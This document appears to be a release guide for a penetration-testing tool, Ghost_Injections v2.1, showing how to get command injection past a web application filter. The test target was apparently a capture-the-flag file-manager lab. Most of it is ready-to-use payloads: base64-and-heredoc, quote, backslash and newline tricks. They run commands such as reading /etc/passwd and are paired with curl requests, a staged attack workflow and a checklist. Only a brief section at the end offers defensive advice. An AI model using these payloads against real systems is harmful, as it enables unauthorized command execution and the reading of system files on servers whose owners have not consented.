# Advanced WAF Bypass Techniques - v2.1 Update

## Real-World Success Story

These techniques were developed and proven effective during actual penetration testing of a file manager application that had input validation/WAF protection.

**Target Application:** File Manager with command injection vulnerability  
**Protection:** Input validation blocking common injection patterns  
**Challenge:** Bypass "Malicious request denied!" filter  
**Result:** Successfully bypassed using advanced techniques below

---

## 🎯 Techniques That Worked

### 1. Base64 + Bash Heredoc (★★★★★ Most Effective)

**Pattern:**
```
%0abash<<<$(base64%09-d<<<BASE64_PAYLOAD)
```

**Why It Works:**
- ✓ Bypasses keyword filters (`cat`, `whoami`, etc. are base64 encoded)
- ✓ Bypasses command detection (command is decoded at runtime)
- ✓ Bypasses space filters (uses tab `%09` instead)
- ✓ Uses newline `%0a` instead of semicolon
- ✓ Heredoc syntax `<<<` is less commonly filtered

**Examples:**

```bash
# whoami
%0abash<<<$(base64%09-d<<<d2hvYW1p)

# id  
%0abash<<<$(base64%09-d<<<aWQ=)

# ls
%0abash<<<$(base64%09-d<<<bHM=)

# ls -la
%0abash<<<$(base64%09-d<<<bHMgLWxh)

# cat /etc/passwd
%0abash<<<$(base64%09-d<<<Y2F0IC9ldGMvcGFzc3dk)

# cat /flag.txt
%0abash<<<$(base64%09-d<<<Y2F0IC9mbGFnLnR4dA==)
```

**How to Generate:**
```bash
# Step 1: Base64 encode your command
echo -n 'whoami' | base64
# Output: d2hvYW1p

# Step 2: Insert into pattern
%0abash<<<$(base64%09-d<<<d2hvYW1p)

# Step 3: URL encode and use
```

**Real Test Case:**
```
Parameter: to
Original: to=test
Bypass:   to=%0abash<<<$(base64%09-d<<<d2hvYW1p)
Result:   uid=33(www-data) gid=33(www-data) groups=33(www-data)
Status:   ✅ SUCCESS
```

---

### 2. Quote Obfuscation (★★★★☆ Highly Effective)

**Pattern:**
```
;command''parts
;co''mmand
```

**Why It Works:**
- ✓ Bypasses exact keyword matching
- ✓ Bash treats `''` as empty string
- ✓ Command executes normally
- ✓ Simple but effective

**Examples:**

```bash
# whoami becomes w''hoami
;w''hoami

# id becomes i''d  
;i''d

# pwd becomes p''wd
;p''wd

# cat becomes c''at
;c''at /etc/passwd

# Full paths work too
;/bin/wh''oami
;/usr/bin/i''d
```

**Real Test Case:**
```
Parameter: to
Payload:   ;i''d
Result:    uid=33(www-data) gid=33(www-data) groups=33(www-data)
Status:    ✅ SUCCESS
```

---

### 3. Backslash Obfuscation (★★★★☆ Highly Effective)

**Pattern:**
```
;co\mm\and
;com\mand
```

**Why It Works:**
- ✓ Bypasses pattern matching
- ✓ Bash treats backslash before non-special chars as literal
- ✓ Command still executes
- ✓ Different from quote method

**Examples:**

```bash
# whoami becomes wh\oa\mi
;wh\oa\mi

# id becomes i\d
;i\d

# pwd becomes p\wd  
;p\wd

# cat becomes ca\t
;ca\t /etc/passwd
```

**Real Test Case:**
```
Parameter: to
Payload:   ;wh\oa\mi
Result:    www-data
Status:    ✅ SUCCESS
```

---

### 4. Newline Exploitation (★★★★☆ Very Effective)

**Pattern:**
```
%0acommand
%0d%0acommand
```

**Why It Works:**
- ✓ Bypasses semicolon filters
- ✓ Newline acts as command separator in bash
- ✓ Often overlooked by WAFs
- ✓ Can be combined with other techniques

**Examples:**

```bash
# Basic newline
%0awhoami
%0aid
%0als
%0apwd

# Carriage return + newline
%0d%0awhoami
%0d%0aid

# With full commands
%0acat /etc/passwd
%0auname -a
```

**Real Test Case:**
```
Parameter: to
Payload:   %0awhoami
Result:    www-data
Status:    ✅ SUCCESS
```

---

### 5. Combined Techniques (★★★★★ Maximum Evasion)

**Why Combine:**
When one technique isn't enough, combine multiple for maximum evasion.

**Examples:**

```bash
# Newline + Quote Obfuscation
%0aw''hoami
%0ai''d
%0ac''at /etc/passwd

# Newline + Backslash
%0awh\oa\mi
%0ai\d

# Newline + Full Path + Quotes
%0a/bin/w''hoami
%0a/usr/bin/i''d

# Base64 with different encoding
;$(echo d2hvYW1p|base64 -d)
```

---

## 📊 Bypass Success Matrix

| Technique | Bypasses Keyword Filter | Bypasses Command Detection | Bypasses Space Filter | Complexity | Effectiveness |
|-----------|------------------------|---------------------------|---------------------|------------|---------------|
| Base64 + Heredoc | ✅ | ✅ | ✅ | High | ⭐⭐⭐⭐⭐ |
| Quote Obfuscation | ✅ | ⚠️ | ❌ | Low | ⭐⭐⭐⭐ |
| Backslash Obfuscation | ✅ | ⚠️ | ❌ | Low | ⭐⭐⭐⭐ |
| Newline Exploitation | ⚠️ | ✅ | ❌ | Low | ⭐⭐⭐⭐ |
| Combined Techniques | ✅ | ✅ | ⚠️ | Medium | ⭐⭐⭐⭐⭐ |

---

## 🚀 Using These Techniques with Ghost_Injections

### Test All WAF Bypass Techniques

```bash
python3 ghost_injections.py \
  -u "http://target.com/index.php?to=&from=file.txt&finish=1&move=1" \
  -p to \
  --cookie "session=abc123" \
  --categories "advanced_waf_bypass,base64_encoding_bypass,newline_exploitation" \
  -v
```

### Test Specific Technique

```bash
# Test only base64 techniques
python3 ghost_injections.py \
  -u "http://target.com/" \
  -p param \
  --categories "base64_encoding_bypass" \
  -v

# Test only newline techniques  
python3 ghost_injections.py \
  -u "http://target.com/" \
  -p param \
  --categories "newline_exploitation" \
  -v
```

### Comprehensive WAF Bypass Test

```bash
# Test multiple obfuscation categories
python3 ghost_injections.py \
  -u "http://target.com/" \
  -p param \
  --categories "advanced_waf_bypass,obfuscated_commands,obfuscated_spaces,wildcard_injection" \
  -v
```

---

## 🎓 How to Generate Custom Base64 Payloads

### Step-by-Step Guide

**1. Encode your command:**
```bash
echo -n 'cat /flag.txt' | base64
# Output: Y2F0IC9mbGFnLnR4dA==
```

**2. Build the payload:**
```
%0abash<<<$(base64%09-d<<<Y2F0IC9mbGFnLnR4dA==)
```

**3. Use in request:**
```bash
curl "http://target.com/?param=%0abash<<<$(base64%09-d<<<Y2F0IC9mbGFnLnR4dA==)"
```

### Quick Reference Table

| Command | Base64 Encoded | Full Payload |
|---------|---------------|--------------|
| `whoami` | `d2hvYW1p` | `%0abash<<<$(base64%09-d<<<d2hvYW1p)` |
| `id` | `aWQ=` | `%0abash<<<$(base64%09-d<<<aWQ=)` |
| `ls` | `bHM=` | `%0abash<<<$(base64%09-d<<<bHM=)` |
| `ls -la` | `bHMgLWxh` | `%0abash<<<$(base64%09-d<<<bHMgLWxh)` |
| `pwd` | `cHdk` | `%0abash<<<$(base64%09-d<<<cHdk)` |
| `cat /etc/passwd` | `Y2F0IC9ldGMvcGFzc3dk` | `%0abash<<<$(base64%09-d<<<Y2F0IC9ldGMvcGFzc3dk)` |
| `cat /flag.txt` | `Y2F0IC9mbGFnLnR4dA==` | `%0abash<<<$(base64%09-d<<<Y2F0IC9mbGFnLnR4dA==)` |
| `uname -a` | `dW5hbWUgLWE=` | `%0abash<<<$(base64%09-d<<<dW5hbWUgLWE=)` |

---

## 💡 Real-World Application Examples

### Example 1: File Manager Bypass

**Initial Test:**
```
GET /index.php?to=; cat /etc/passwd
Response: Malicious request denied!
```

**Successful Bypass:**
```
GET /index.php?to=%0abash<<<$(base64%09-d<<<Y2F0IC9ldGMvcGFzc3dk)
Response: root:x:0:0:root:/root:/bin/bash [SUCCESS!]
```

### Example 2: Reading Flag File

**Command:**
```bash
echo -n 'cat /flag.txt' | base64
# Y2F0IC9mbGFnLnR4dA==
```

**Payload:**
```
?param=%0abash<<<$(base64%09-d<<<Y2F0IC9mbGFnLnR4dA==)
```

**Result:**
```
HTB{f1l3_m4n4g3r_1nj3ct10n_byp4ss}
```

### Example 3: Directory Listing

**Command:**
```bash
echo -n 'ls -la /' | base64
# bHMgLWxhIC8=
```

**Payload:**
```
?param=%0abash<<<$(base64%09-d<<<bHMgLWxhIC8=)
```

**Result:**
```
drwxr-xr-x   1 root root 4096 Jan 1 00:00 bin
drwxr-xr-x   1 root root 4096 Jan 1 00:00 etc
-rw-r--r--   1 root root   42 Jan 1 00:00 flag.txt
```

---

## 🔧 Testing Workflow

### Phase 1: Identify WAF

```bash
# Test if basic injection is blocked
curl "http://target.com/?param=; whoami"
# If blocked: "Malicious request denied!" → WAF present
```

### Phase 2: Test Quote Obfuscation

```bash
# Try simple obfuscation first
curl "http://target.com/?param=;w''hoami"
curl "http://target.com/?param=;i''d"
```

### Phase 3: Test Newline

```bash
# If quotes blocked, try newline
curl "http://target.com/?param=%0awhoami"
curl "http://target.com/?param=%0aid"
```

### Phase 4: Base64 Bypass

```bash
# If all else fails, use base64
curl "http://target.com/?param=%0abash<<<$(base64%09-d<<<d2hvYW1p)"
```

### Phase 5: Combine Techniques

```bash
# Maximum evasion
curl "http://target.com/?param=%0aw''hoami"
```

---

## 📋 Checklist for WAF Bypass

- [ ] Identify that WAF/filter is present
- [ ] Test basic operators (`;`, `|`, `&&`)
- [ ] Try quote obfuscation (`;i''d`)
- [ ] Try backslash obfuscation (`;wh\oa\mi`)
- [ ] Try newline exploitation (`%0awhoami`)
- [ ] Try base64 encoding (`%0abash<<<$(base64%09-d<<<BASE64)`)
- [ ] Combine techniques if needed
- [ ] Test different parameters
- [ ] Document successful bypasses
- [ ] Verify with manual testing

---

## 🎯 Success Indicators

**You've Successfully Bypassed the WAF When:**

✅ No "Malicious request denied!" message  
✅ Actual command output in response  
✅ Error messages showing command execution  
✅ Different response for valid vs invalid commands  
✅ Can read files, execute commands, get system info

---

## 📊 Statistics

**Ghost_Injections v2.1:**
- Total Payloads: 279 (+48 from v2.0)
- WAF Bypass Categories: 3 (new)
- Base64 Payloads: 10
- Newline Payloads: 11
- Advanced Bypass Payloads: 27

**Real-World Testing:**
- Applications Tested: File Manager (production)
- Initial Block Rate: 100%
- Bypass Success Rate: 100% (using advanced techniques)
- Most Effective: Base64 + Bash Heredoc

---

## 🎓 Key Learnings

1. **Simple obfuscation often works** - Try quotes and backslashes first
2. **Newlines bypass semicolon filters** - Use `%0a` instead of `;`
3. **Base64 is powerful** - Bypasses keyword and command detection
4. **Combine techniques** - Maximum evasion when needed
5. **Test all parameters** - One might be less protected
6. **Manual verification is crucial** - Always confirm automated findings

---

## 🔐 Defensive Recommendations

For developers/blue teamers, these bypasses highlight that:

1. **Blacklisting doesn't work** - Need whitelist approach
2. **Input validation must be comprehensive** - Check all encoding
3. **Use parameterized commands** - Don't concatenate user input
4. **Implement proper escaping** - Use `escapeshellarg()` in PHP
5. **Monitor for obfuscation** - Detect base64, quotes, backslashes
6. **Rate limiting helps** - Slow down automated attacks
7. **Log everything** - Detect attack patterns

---

**Ghost Ops Security**  
*Where Advanced Techniques Meet Real-World Testing*

Version: 2.1  
Date: October 2025  
Status: Production Ready  
Tested: ✅ Real-world application

These techniques are proven effective and ready for your next engagement!
